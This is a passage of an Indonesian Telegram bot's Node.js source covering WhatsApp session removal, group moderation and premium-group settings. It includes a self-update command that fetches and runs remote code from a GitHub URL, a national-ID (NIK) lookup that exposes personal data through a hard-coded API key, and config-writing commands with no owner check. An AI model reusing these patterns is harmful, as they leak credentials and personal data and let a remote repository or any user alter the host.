  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

const Owner = "Darlin77";
const Repo = "Base-";
const BranchPath = "main/index.js";

const DEFAULT_RAW_URL = `https://raw.githubusercontent.com/${Owner}/${Repo}/refs/heads/${BranchPath}`;

const BOT_FILE = path.join(__dirname, 'index.js');
const BACKUP_FILE = path.join(__dirname, 'index.js.bak');

async function downloadFile(url, outputPath) {
  const writer = fs.createWriteStream(outputPath);
  const response = await axios({
    method: 'get',
    url: url,
    responseType: 'stream',
  });
  response.data.pipe(writer);
  return new Promise((resolve, reject) => {
    writer.on('finish', resolve);
    writer.on('error', reject);
  });
}

bot.onText(/\/autoUpdate/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, '❌ Perintah ini hanya untuk owner bot.', { parse_mode: 'Markdown' });
  }

  const makeBar = (pct) => {
    const total = 14;
    const filled = Math.round((pct / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
  };

  const render = (pct, status, note) => {
    return `\`\`\`js
${status}
━━━━━━━━━━━━━━━
${makeBar(pct)} ${pct}%
━━━━━━━━━━━━━━━
📦 Repo: Darlin77/Base-
📁 File: main/index.js
${note}
\`\`\``;
  };

  const sent = await bot.sendMessage(chatId, render(0, "🔄 Updating...", ""), { parse_mode: 'Markdown' });
  const mid = sent.message_id;

  const upd = async (pct, status, note) => {
    try {
      await bot.editMessageText(render(pct, status, note), {
        chat_id: chatId, message_id: mid, parse_mode: 'Markdown'
      });
    } catch (e) {}
  };

  try {
    await sleep(500);
    await upd(15, "🔄 Connecting...", "▶️ Menghubungkan ke GitHub");

    await sleep(500);
    await upd(30, "📦 Backup...", "▶️ Membuat backup index.js");

    if (fs.existsSync(BOT_FILE)) {
      fs.copyFileSync(BOT_FILE, BACKUP_FILE);
    }

    await sleep(500);
    await upd(50, "📥 Downloading...", "▶️ Mengunduh file baru");

    await downloadFile(DEFAULT_RAW_URL, BOT_FILE);

    await sleep(500);
    await upd(80, "💾 Installing...", "▶️ Menyimpan file baru");

    await sleep(500);
    await upd(100, "✅ Update Complete", "♻️ Restart dalam 3 detik...");

    setTimeout(() => process.exit(0), 3000);

  } catch (error) {
    await upd(0, "❌ Update Failed", `Reason: ${error.message}`);

    if (fs.existsSync(BACKUP_FILE)) {
      fs.copyFileSync(BACKUP_FILE, BOT_FILE);
      await sleep(500);
      await upd(100, "🔙 Rolled Back", "▶️ Restored previous version");
    }
  }
});

bot.onText(/\/cekrepo/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, '❌ Hanya owner.');
  bot.sendMessage(chatId, `🔗 Raw URL:\n\`${DEFAULT_RAW_URL}\``, { parse_mode: 'Markdown' });
});

console.log(`✅ Auto update siap. Repo: ${Owner}/${Repo} -> ${BranchPath}`);

const groupMenuData = {}

function ensure(chatId) {
  if (!groupMenuData[chatId]) {
    groupMenuData[chatId] = {
      welcome: { enabled: true, text: "Selamat datang {name}!", photo: null },
      rules: "Belum ada rules.",
      warns: {},
      blocklist: []
    }
  }
}

function parseDurationToSeconds(s) {
  if (!s) return null
  const m = s.match(/^(\d+)(s|m|h|d)$/i)
  if (!m) return null
  const n = parseInt(m[1], 10)
  const u = m[2].toLowerCase()
  if (u === "s") return n
  if (u === "m") return n * 60
  if (u === "h") return n * 3600
  if (u === "d") return n * 86400
  return null
}

async function isAdmin(bot, chatId, userId) {
  const admins = await bot.getChatAdministrators(chatId)
  return admins.some(a => a.user.id === userId)
}

bot.on("message", async (msg) => {
  const chatId = msg.chat.id
  ensure(chatId)
  const txt = msg.text || ""
  if (msg.new_chat_members && groupMenuData[chatId].welcome && groupMenuData[chatId].welcome.enabled) {
    for (const u of msg.new_chat_members) {
      const name = u.username ? "@" + u.username : u.first_name
      const caption = (groupMenuData[chatId].welcome.text || "Welcome").replace(/\{name\}/g, name)
      const buttons = {
        reply_markup: {
          inline_keyboard: [
            [{ text: "👥 Rules", callback_data: "show_rules" }],
            [{ text: "📢 Info Grup", callback_data: "show_info" }]
          ]
        }
      }
      try {
        if (groupMenuData[chatId].welcome.photo) {
          await bot.sendPhoto(chatId, groupMenuData[chatId].welcome.photo, { caption, ...buttons })
        } else {
          await bot.sendMessage(chatId, caption, buttons)
        }
      } catch {}
    }
  }
  if (msg.left_chat_member) {
    const name = msg.left_chat_member.username ? "@" + msg.left_chat_member.username : msg.left_chat_member.first_name
    try { await bot.sendMessage(chatId, `${name} keluar dari grup`) } catch {}
  }
  if (txt && /@admin/i.test(txt)) {
    try {
      const admins = await bot.getChatAdministrators(chatId)
      const mentions = admins.filter(a => !a.user.is_bot).map(a => a.user.username ? "@" + a.user.username : a.user.first_name).join(" ")
      await bot.sendMessage(chatId, "Memanggil admin:\n" + (mentions || "Tidak ada admin"))
    } catch {}
  }
  if (txt && groupMenuData[chatId].blocklist && groupMenuData[chatId].blocklist.length) {
    for (const bad of groupMenuData[chatId].blocklist) {
      if (!bad) continue
      try {
        if (txt.toLowerCase().includes(bad.toLowerCase())) {
          await bot.deleteMessage(chatId, msg.message_id)
          return
        }
      } catch {}
    }
  }
})

bot.on("callback_query", async (q) => {
  const chatId = q.message.chat.id
  ensure(chatId)
  const d = q.data
  if (d === "show_rules") {
    await bot.answerCallbackQuery(q.id)
    await bot.sendMessage(chatId, `👥 Rules Grup:\n\n${groupMenuData[chatId].rules}`)
    return
  }
  if (d === "show_info") {
    await bot.answerCallbackQuery(q.id)
    try {
      const chat = await bot.getChat(chatId)
      const desc = chat.description || "Tidak ada deskripsi grup."
      await bot.sendMessage(chatId, `📢 Info Grup:\n\n${desc}`)
    } catch { await bot.sendMessage(chatId, "Gagal mengambil deskripsi grup") }
    return
  }
  if (d === "welcome_on") {
    groupMenuData[chatId].welcome.enabled = true
    await bot.answerCallbackQuery(q.id, { text: "Welcome Active" })
    await bot.sendMessage(chatId, "Welcome Active")
    return
  }
  if (d === "welcome_off") {
    groupMenuData[chatId].welcome.enabled = false
    await bot.answerCallbackQuery(q.id, { text: "Welcome Non Active" })
    await bot.sendMessage(chatId, "Welcome Non Active")
    return
  }
  if (d.startsWith("clear_warn_")) {
    const parts = d.split("_")
    const uid = parseInt(parts[2], 10)
    groupMenuData[chatId].warns[uid] = 0
    await bot.answerCallbackQuery(q.id, { text: "Warn direset" })
    await bot.sendMessage(chatId, "Warn user telah direset")
    return
  }
  if (d.startsWith("unwarn_")) {
    const uid = parseInt(d.split("_")[1], 10)
    const cur = groupMenuData[chatId].warns[uid] || 0
    if (cur <= 0) {
      await bot.answerCallbackQuery(q.id, { text: "User tidak punya warn" })
      return
    }
    groupMenuData[chatId].warns[uid] = cur - 1
    await bot.answerCallbackQuery(q.id, { text: "Warn dikurangi" })
    await bot.sendMessage(chatId, `Warn user berkurang (${groupMenuData[chatId].warns[uid]}/3)`)
    return
  }
  if (d.startsWith("delblock_")) {
    const raw = d.replace("delblock_", "")
    const word = decodeURIComponent(raw)
    groupMenuData[chatId].blocklist = (groupMenuData[chatId].blocklist || []).filter(w => w !== word)
    await bot.answerCallbackQuery(q.id, { text: "Kata dihapus" })
    await bot.sendMessage(chatId, `${word} dihapus dari blocklist`)
    return
  }
  if (d === "unpin") {
    try { await bot.unpinChatMessage(chatId); await bot.answerCallbackQuery(q.id, { text: "Pesan di-unpin" }); await bot.sendMessage(chatId, "Pesan di-unpin") } catch { await bot.answerCallbackQuery(q.id, { text: "Gagal unpin" }) }
    return
  }
})

bot.onText(/^\/setrules(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const t = match && match[1] ? match[1].trim() : ""
  if (!t) return bot.sendMessage(chatId, "Gunakan: /setrules <rules>")
  groupMenuData[chatId].rules = t
  bot.sendMessage(chatId, "Rules Updated !")
})

bot.onText(/^\/setwelcome(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const textArg = match && match[1] ? match[1].trim() : null
  if (textArg) groupMenuData[chatId].welcome.text = textArg
  if (msg.reply_to_message && msg.reply_to_message.photo) {
    const ph = msg.reply_to_message.photo
    groupMenuData[chatId].welcome.photo = ph[ph.length - 1].file_id
  }
  groupMenuData[chatId].welcome.enabled = true
  await bot.sendMessage(chatId, "Welcome Updated !", {
  })
})

bot.onText(/^\/welcome\s+(on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id
  ensure(chatId)
  groupMenuData[chatId].welcome.enabled = match[1].toLowerCase() === "on"
  bot.sendMessage(chatId, `Welcome ${groupMenuData[chatId].welcome.enabled ? "Active !" : "Non Active !"}`)
})

bot.onText(/^\/addblocklist\s+(.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  ensure(chatId)
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  const word = match[1].trim()
  if (!word) return bot.sendMessage(chatId, "Gunakan: /addblocklist <pesan>")
  if (!groupMenuData[chatId].blocklist.includes(word)) groupMenuData[chatId].blocklist.push(word)
  bot.sendMessage(chatId, `${word} ditambahkan ke blocklist`, {
    reply_markup: { inline_keyboard: [[{ text: "Hapus kata", callback_data: "delblock_" + encodeURIComponent(word) }]] }
  })
})

bot.onText(/^\/delblocklist\s+(.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const word = match[1].trim()
  groupMenuData[chatId].blocklist = (groupMenuData[chatId].blocklist || []).filter(w => w !== word)
  bot.sendMessage(chatId, `${word} dihapus dari blocklist`)
})

bot.onText(/^\/blocklist$/i, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const list = (groupMenuData[chatId].blocklist || []).join("\n") || "Blocklist kosong"
  bot.sendMessage(chatId, `📌 Blocklist:\n${list}`)
})

function getTarget(msg) {
  if (msg.reply_to_message && msg.reply_to_message.from) return msg.reply_to_message.from.id;

  const check = (entities, text) => {
    if (!entities || !text) return null;
    for (const e of entities) {
      if (e.type === 'text_mention' && e.user) return e.user.id;
      if (e.type === 'mention') return text.substring(e.offset + 1, e.offset + e.length);
    }
    return null;
  };

  const fromText = check(msg.entities, msg.text);
  if (fromText) return fromText;

  const fromCaption = check(msg.caption_entities, msg.caption);
  if (fromCaption) return fromCaption;

  return null;
}

async function resolveUsername(bot, chatId, username) {
  try {
    const members = await bot.getChatAdministrators(chatId)
    const found = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase())
    return found ? found.user.id : null
  } catch {
    return null
  }
}

bot.onText(/^\/promote/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.promoteChatMember(chatId, target, {
      can_manage_chat: true,
      can_delete_messages: true,
      can_invite_users: true,
      can_restrict_members: true
    })
    bot.sendMessage(chatId, "Promoted !")
  } catch(e) {
    bot.sendMessage(chatId, "Gagal promote" + e)
  }
})

bot.onText(/^\/demote/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.promoteChatMember(chatId, target, {
      can_manage_chat: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false
    })
    bot.sendMessage(chatId, "Demoted !")
  } catch(e) {
    bot.sendMessage(chatId, "Gagal demote" + e)
  }
})

bot.onText(/^\/mute/, async (msg) => {
  if (!msg.chat.type.includes("group")) return;
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  try {
    await bot.restrictChatMember(chatId, target, {
      permissions: {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_polls: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false,
      },
    });
    await bot.sendMessage(chatId, `User ${reply.from.first_name} Telah Di Mute !.`);
  } catch (e) {
    await bot.sendMessage(chatId, `❌ ⵢ Gagal mute user: ${e.message}`);
  }
});

bot.onText(/^\/unmute/, async (msg) => {
  if (!msg.chat.type.includes("group")) return;
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  try {
    await bot.restrictChatMember(chatId, target, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false,
      },
    });
    await bot.sendMessage(chatId, `User ${reply.from.first_name} Telah Di Unmute !.`);
  } catch (e) {
    await bot.sendMessage(chatId, `❌ ⵢ Gagal unmute user: ${e.message}`);
  }
});

bot.onText(/^\/kick/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.banChatMember(chatId, target)
    await bot.unbanChatMember(chatId, target)
    bot.sendMessage(chatId, "User Kick !")
  } catch {
    bot.sendMessage(chatId, "Gagal kick")
  }
})

bot.onText(/^\/band/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.banChatMember(chatId, target)
    bot.sendMessage(chatId, "User Banned !")
  } catch(e) {
    bot.sendMessage(chatId, "Gagal ban" + e)
  }
})

bot.onText(/^\/unban/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.unbanChatMember(chatId, target)
    bot.sendMessage(chatId, "User Unbanned !")
  } catch {
    bot.sendMessage(chatId, "Gagal unban")
  }
})

bot.onText(/^\/warn$/i, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const reply = msg.reply_to_message
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  ensure(chatId)
  const uid = reply.from.id
  groupMenuData[chatId].warns[uid] = (groupMenuData[chatId].warns[uid] || 0) + 1
  const cnt = groupMenuData[chatId].warns[uid]
  if (cnt >= 3) {
    try {
      await bot.kickChatMember(chatId, uid)
      groupMenuData[chatId].warns[uid] = 0
      await bot.sendMessage(chatId, `${reply.from.first_name} dikick karena 3 warn`, { reply_markup: { inline_keyboard: [[{ text: "Unban", callback_data: "unban_" + uid }]] } })
    } catch { await bot.sendMessage(chatId, "Gagal kick") }
  } else {
    await bot.sendMessage(chatId, `${reply.from.first_name} mendapat warn (${cnt}/3)`, { reply_markup: { inline_keyboard: [[{ text: "Unwarn", callback_data: "unwarn_" + uid }, { text: "Remove Warn", callback_data: "clear_warn_" + uid }]] } })
  }
})

bot.onText(/^\/unwarn$/i, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const reply = msg.reply_to_message
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  ensure(chatId)
  const uid = reply.from.id
  if (!groupMenuData[chatId].warns[uid] || groupMenuData[chatId].warns[uid] <= 0) return bot.sendMessage(chatId, "User tidak punya warn")
  groupMenuData[chatId].warns[uid] -= 1
  await bot.sendMessage(chatId, `Warn berkurang (${groupMenuData[chatId].warns[uid]}/3)`, { reply_markup: { inline_keyboard: [[{ text: "Remove Warn", callback_data: "clear_warn_" + uid }]] } })
})

bot.onText(/^\/pin$/i, async (msg) => {
  const chatId = msg.chat.id
  const reply = msg.reply_to_message
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  try {
    await bot.pinChatMessage(chatId, reply.message_id)
    await bot.sendMessage(chatId, "Pinned!", { reply_markup: { inline_keyboard: [[{ text: "Unpin Message", callback_data: "unpin" }]] } })
  } catch { await bot.sendMessage(chatId, "Gagal pin") }
})

bot.onText(/^\/nikparse(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const args = (match[1] || "").split(" ");
  const nik = args[0];
  
  let joined = await checkJoined(userId);

  if (!joined) {
    return sendJoinMessage(chatId);
  }

  if (!nik) {
    return bot.sendMessage(chatId, "❌ ⵢ Format : /nikparse 3510243006730004");
  }

  try {
    const waitMsg = await bot.sendMessage(chatId, "Process Search NIK...");

    const response = await axios.get(
      `https://nik-parser.p.rapidapi.com/ektp?nik=${nik}`,
      {
        headers: {
          'x-rapidapi-host': 'nik-parser.p.rapidapi.com',
          'x-rapidapi-key': '972f5c568dmsh552ff4877326665p1b6e67jsn290d2652a173'
        },
        timeout: 15000
      }
    );

    const result = response.data;

    try {
      await bot.deleteMessage(chatId, waitMsg.message_id);
    } catch (e) {}

    if (result.errCode !== 0) {
      return bot.sendMessage(chatId, `Gagal parsing NIK: ${result.errMessage || 'Unknown error'}`);
    }

    const data = result.data;

    let caption = `<blockquote><b>¡ ᬊ X-Vaelix Infinity ¡</b></blockquote>\n\n`;
    caption += `┃☰. - NIK: ${nik}\n\n`;
    caption += `〢-╰➤ ° ↯ Provinsi: ${data.province || 'Tidak diketahui'}\n`;
    caption += `┃☰. - Kota/Kab: ${data.city || 'Tidak diketahui'}\n`;
    caption += `〢-╰➤ ° ↯ Kecamatan: ${data.district || 'Tidak diketahui'}\n`;
    caption += `┃☰. - Kode Pos: ${data.zipcode || 'Tidak diketahui'}\n\n`;
    caption += `〢-╰➤ ° ↯ Jenis Kelamin: ${data.gender || 'Tidak diketahui'}\n`;
    caption += `┃☰. - Tanggal Lahir: ${data.birthdate || 'Tidak diketahui'}\n`;
    caption += `〢-╰➤ ° ↯ Uniq Code: ${data.uniqcode || 'Tidak diketahui'}`;

    await bot.sendMessage(chatId, caption, { parse_mode: "HTML" });

  } catch (error) {
    console.error('NIK Parse error:', error.response?.data || error.message);
    
    let errorMessage = 'Gagal parsing NIK\n\n';
    
    if (error.response) {
      if (error.response.status === 400) {
        errorMessage += 'NIK tidak valid';
      } else {
        errorMessage += `Status: ${error.response.status}`;
      }
    } else if (error.code === 'ECONNABORTED') {
      errorMessage += 'Timeout: Request terlalu lama';
    } else {
      errorMessage += `Error: ${error.message}`;
    }
    
    await bot.sendMessage(chatId, errorMessage);
  }
});

bot.onText(/\/cekpremiumgroup/, async (msg) => {
  const chatId = msg.chat.id;
  const chatType = msg.chat.type;

  if (chatType !== 'group' && chatType !== 'supergroup') {
    return bot.sendMessage(
      chatId, 
      "❌ Perintah ini hanya dapat digunakan di dalam **Grup** atau **Supergroup** untuk mengecek status grup tersebut.",
      { parse_mode: "Markdown" }
    );
  }
  
  const pathConfigNode = "./config.js"; 

  try {
    if (require.cache[require.resolve(pathConfigNode)]) {
      delete require.cache[require.resolve(pathConfigNode)];
    }
    let currentConfig = require(pathConfigNode);

    const isPremium = currentConfig.PREMIUM_GROUPS && currentConfig.PREMIUM_GROUPS.includes(chatId.toString());

    if (isPremium) {
      await bot.sendMessage(
        chatId,
        `\`\`\`js\n╭─────────────────\n│   HASIL CEK STATUS GRUP   \n│────────────────\n│ ID: ${chatId}\n│ Status: AKTIF (PREMIUM) ✨\n│\n│ Semua fitur premium bot\n│ terbuka di grup ini.\n╰─────────────────\`\`\``,
        { parse_mode: "Markdown" }
      );
    } else {
      await bot.sendMessage(
        chatId,
        `\`\`\`\n╭─────────────────\n│   HASIL CEK STATUS GRUP   \n│────────────────\n│ ID: ${chatId}\n│ Status: FREE (REGULER) ❌\n│\n│ Gunakan perintah:\n│ /addgrouppremium ${chatId}\n│ di chat bot untuk aktivasi.\n╰─────────────────\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

  } catch (error) {
    console.error("Error saat mengecek status grup premium:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan internal saat memeriksa status data grup. Coba lagi.",
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/\/delgroupremium (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetGroupId = match[1].trim();
  
  const pathConfigNode = "./config.js"; 

  try {
    if (require.cache[require.resolve(pathConfigNode)]) {
      delete require.cache[require.resolve(pathConfigNode)];
    }
    let currentConfig = require(pathConfigNode);

    if (!currentConfig.PREMIUM_GROUPS || currentConfig.PREMIUM_GROUPS.length === 0) {
      return bot.sendMessage(
        chatId,
        `\`\`\`\n╭─────────────────\n│    GAGAL MENGHAPUS    \n│────────────────\n│ ID Grup: ${targetGroupId}\n│ Tidak ditemukan dalam\n│ daftar Grup Premium.\n╰─────────────────\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

    if (!currentConfig.PREMIUM_GROUPS.includes(targetGroupId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`\n╭─────────────────\n│    GAGAL MENGHAPUS    \n│────────────────\n│ ID Grup: ${targetGroupId}\n│ Memang tidak berstatus\n│ Premium.\n╰─────────────────\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

    currentConfig.PREMIUM_GROUPS = currentConfig.PREMIUM_GROUPS.filter(id => id !== targetGroupId);

    const fs = require('fs');
    const newContent = `module.exports = {
  BOT_TOKEN: "${currentConfig.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(currentConfig.OWNER_ID)},
  PREMIUM_GROUPS: ${JSON.stringify(currentConfig.PREMIUM_GROUPS)},
};`;

    fs.writeFileSync(pathConfigNode, newContent, "utf8");
    
    delete require.cache[require.resolve(pathConfigNode)];

    await bot.sendMessage(
      chatId,
      `\`\`\`js\n╭─────────────────\n│   SUKSES HAPUS PREMIUM  \n│────────────────\n│ ID Grup: ${targetGroupId}\n│ Status: NON-PREMIUM (FREE)\n│\n│ Perubahan berhasil disimpan\n│ otomatis ke config.js\n╰─────────────────\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error("Error saat menghapus grup premium:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan internal saat memproses penghapusan data grup. Coba lagi.",
      { parse_mode: "Markdown" }
    );
  }
});

function reloadConfig() {
  delete require.cache[require.resolve(configPath)];
  config = require(configPath);
}

function isGroupPremium(chatId) {
  reloadConfig();
  if (!config.PREMIUM_GROUPS) return false;
  return config.PREMIUM_GROUPS.includes(chatId.toString());
}

bot.onText(/\/addgroupremium (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetGroupId = match[1].trim();
  
  const pathConfigNode = "./config.js"; 

  try {
    if (require.cache[require.resolve(pathConfigNode)]) {
      delete require.cache[require.resolve(pathConfigNode)];
    }
    let currentConfig = require(pathConfigNode);

    if (!currentConfig.PREMIUM_GROUPS) {
      currentConfig.PREMIUM_GROUPS = [];
    }

    if (currentConfig.PREMIUM_GROUPS.includes(targetGroupId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`\n╭─────────────────\n│    GAGAL MENAMBAHKAN    \n│────────────────\n│ ID Grup: ${targetGroupId}\n│ Sudah terdaftar sebagai\n│ Grup Premium sebelumnya.\n╰─────────────────\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

    currentConfig.PREMIUM_GROUPS.push(targetGroupId);

    const fs = require('fs');
    const newContent = `module.exports = {
  BOT_TOKEN: "${currentConfig.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(currentConfig.OWNER_ID)},
  PREMIUM_GROUPS: ${JSON.stringify(currentConfig.PREMIUM_GROUPS)},
};`;

    fs.writeFileSync(pathConfigNode, newContent, "utf8");
    
